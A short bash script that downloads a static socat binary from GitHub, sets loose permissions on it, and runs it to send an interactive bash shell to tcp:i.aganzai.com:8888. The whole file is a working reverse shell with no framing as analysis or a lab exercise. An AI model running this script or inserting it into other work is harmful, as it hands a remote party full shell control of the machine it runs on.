#!/bin/bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod 7777 socat
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:i.aganzai.com:8888
